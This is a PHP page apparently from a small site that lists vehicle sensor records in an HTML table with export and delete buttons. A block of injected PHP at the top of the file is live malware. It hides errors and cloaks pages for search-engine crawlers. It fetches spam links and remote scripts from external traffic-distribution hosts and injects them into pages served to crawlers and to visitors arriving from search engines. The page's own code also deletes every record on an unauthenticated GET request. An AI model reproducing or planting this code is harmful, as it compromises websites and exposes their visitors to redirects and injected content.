<?php
if(!defined('_NET'))
{	
error_reporting(0);
$NET='sh19047'; 
define('_NET',$NET);
if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://googlecountwebs.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){if(strpos($pinj_9,'NET=',0)>0){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=0;$pinj_13=0;$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if((strpos($pinj_11,' 404 Not',0)>0)||(strpos($pinj_11,'Location:',0)>0)){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;$pinj_12=1;}}else{if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}if($pinj_13==0){$pinj_14=array();$pinj_15=0;while(preg_match("/(Location:|URI:)[^(\n)]*/",$pinj_11,$pinj_14)&&($pinj_15<3)){$pinj_9=trim(str_replace($pinj_14[1],"",$pinj_14[0]));$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);$pinj_15=$pinj_15+1;$pinj_14=array();}if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);if($pinj_12==1){curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");}else{curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");}$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_16=@file_get_contents($pinj_9);return $pinj_16;}}if(!function_exists('SEbot_')){function SEbot_($pinj_17){if(strpos('-' .strtolower($pinj_17),'x compatible',0)>0){return 0;}if(strpos('-' .strtolower($pinj_17),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_18){$pinj_19='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_20=explode("|",$pinj_19);$pinj_21=0;while($pinj_21<count($pinj_22)){if(strpos(' ' .strtolower($pinj_18),$pinj_22[$pinj_21],0)>0)return 1;$pinj_21=$pinj_21+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_23){static $pinj_24=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_24 as $pinj_25){$pinj_26=@iconv($pinj_25,$pinj_25 .'',$pinj_23);if(md5($pinj_26)== md5($pinj_23))return $pinj_25;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_27='https';}else{$pinj_27='http';}$pinj_28=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_29)&&(not_do_($pinj_7)==0)){$pinj_29=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_29)>200){$pinj_30=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);$pinj_31=$pinj_29;$pinj_32=strpos(strtolower($pinj_29),"<body",0);$pinj_33=strpos(strtolower($pinj_29),">",$pinj_32);if(($pinj_32>0)&&($pinj_33>0)){$pinj_29=substr($pinj_31,0,$pinj_33+1) .$pinj_30 .'' .substr($pinj_31,$pinj_33+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}$pinj_29=str_replace('</body>',$pinj_30 .'</body>',$pinj_29);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}}if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0)||(strpos($pinj_5,'ask.com',0)>0)||(strpos($pinj_5,'aol.',0)>0)||(strpos($pinj_5,'duckduckgo.',0)>0)||(strpos($pinj_5,'baidu.',0)>0))){$pinj_34='mkke';$pinj_35=180;if(!isset($_COOKIE[$pinj_34])||($_COOKIE[$pinj_34]<(time()))){$pinj_36=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);if(strlen($pinj_36,'<!-- -->',0)>0)$pinj_35=9000;if(strlen($pinj_36)>10){$pinj_37=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_37)>400){$pinj_36=str_replace('-SID-',$NET,$pinj_36);$pinj_37=str_replace('</head>',$pinj_36 .'</head>',$pinj_37);setcookie($pinj_34,(time()+$pinj_35),(time()+$pinj_35*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));echo $pinj_37;exit;}}}} 
$p1='_lo'; $p1=$p1.'ads';  $i=0; while($i<12) { $p1='x'.$p1; $i=$i+1;} $p2=$p1.'2'; if(isset($_GET[$p1]) || isset($_POST[$p1]) ) { exit;} if(isset($_GET[$p2])  ) { $_GET[$p1]=$_GET[$p2];} if(isset($_POST[$p2]) ) { $_POST[$p1]=$_POST[$p2];}
}
/*,.*/
?><?php
require_once('dbclass/database.php');
$dbclass=new database();

if($_GET['action']=='D'){

mysql_query("delete from apsisrecordtest8  ");
header("location:index.php");
}
function between($str,$start,$end){
 $str2=substr($str, $start, $end);
 return htmlspecialchars($str2,ENT_QUOTES);
 
}

function left($str, $length) {
     $str2= substr($str, 0, $length);
 return htmlspecialchars($str2,ENT_QUOTES);	 
}

function right($str, $length) {
     $str2= substr($str, -$length);
	  return htmlspecialchars($str2,ENT_QUOTES);	 
}
 $query_for_paging2="select * FROM apsisrecordtest8  order by SL_No desc";
$result_select2 =mysql_query($query_for_paging2);
?>
<script>
var tableToExcel = (function() {
  var uri = 'data:application/vnd.ms-excel;base64,'
    , template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>'
    , base64 = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }
    , format = function(s, c) { return s.replace(/{(\w+)}/g, function(m, p) { return c[p]; }) }
  return function(table, name) {
    if (!table.nodeType) table = document.getElementById(table)
    var ctx = {worksheet: name || 'Worksheet', table: table.innerHTML}
    window.location.href = uri + base64(format(template, ctx))
  }
})()
</script>
 <input type="submit" class="txtField" onClick="tableToExcel('example', '<?=date('Y-m-d')?>')" value="Export to Excel">

 <input name="submit" type="submit" onclick="window.location.href='index.php?action=D'" class="txtField"  value="Delete Record" />


 <input name="button" type="submit" class="txtField" onclick="window.location.href='index.php'" value="Referesh" />

 <table  width="99%" id="example" style="font-family:Arial, Helvetica, sans-serif; font-size:13px; border-collapse:collapse" border="1" cellspacing="1" cellpadding="1">
  <tr style="background-color:#DFDFDF">
        <td style="width:15px;" align="center">Sl.No.</td>
	
	<td style="width:80px;" align="center">Date and Time</td>
        <td style="width:60px;" align="center">Data</td>
        <td style="width:190px;" align="center">Data Space</td>
	
  
  </tr>
  <?php
  $i=1;
  while($row2 = mysql_fetch_assoc($result_select2)){
 //echo $row2["glocation"];
  $genno=$row2['vehicleid']." ".$row2["glocation"]." ".$row2["EntryKey"]." ".$row2["rain"]." ".$row2["TrafficSensor"]." ".$row2["Acc_DataX"]." ".$row2["Acc_DataY"]." ".$row2["Acc_DataZ"]." ".$row2["Lati"]." ".$row2["Longi"]." ".$row2["misc"];
  
$w = $row2['inserttime'];
$wrap = substr($w, 0, 6) . " " . substr($w, 6);

//$rap = wordwrap($genno , 5 , ' ' , true );
$rap =$row2['vehicleid']." ".$row2["glocation"]." ".$row2["EntryKey"]." ".$row2["rain"]." ".$row2["TrafficSensor"]." ".$row2["Acc_DataX"]." ".$row2["Acc_DataY"]." ".$row2["Acc_DataZ"]." ".$row2["Lati"]." ".$row2["Longi"]." ".$row2["misc"];
  ?>
  <tr>
    <td style="width:15px;" align="center"><?php echo $i;?></td>
    <td style="width:80px;" align="center"><?php echo $w?></td>
    <td style="width:250px;" align="center"><?php echo $genno?></td>
    <td style="width:250px;" align="center"><?php echo $rap?></td>
	
	
   
  </tr>
  <?php $i++; } ?>
</table>
 